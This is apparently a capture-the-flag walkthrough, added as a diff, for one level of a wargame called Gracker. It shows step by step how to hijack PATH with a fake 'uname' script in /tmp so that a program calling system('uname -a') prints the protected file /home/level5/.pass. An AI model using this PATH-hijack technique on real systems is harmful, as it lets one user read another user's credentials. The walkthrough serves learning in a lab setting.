@@ -1,0 +1,25 @@
+It is an interesting question.
+Based on the use of PATH executable command.
+What we have to do is to somehow print the content of '/home/level5/.pass'.
+Having a look at the level4.c we notice 'system("uname -a")' which calls the executable uname.So changing the content of uname to 'strings /home/level5/.pass' will do our job.
+We cannot modify the actual uname but we can fake one.
+
+Gracker allows creating tmp directories.
+so---------
+           $ mkdir /tmp
+           $ cd /tmp
+           $ touch uname
+           $ echo "strings /home/level5/.pass" > uname
+           $ chmod +x uname -----making the file executable
+           
+now going again to /matrix/level4, we have to make our tmp directory more prior than the directory containing the original uname file.
+To do that 
+	   $ PATH="/tmp:$PATH"
+           $ printenv PATH ---- to verify
+
+then simply run ./level4 to get the password.
+
+
+
+
+ 
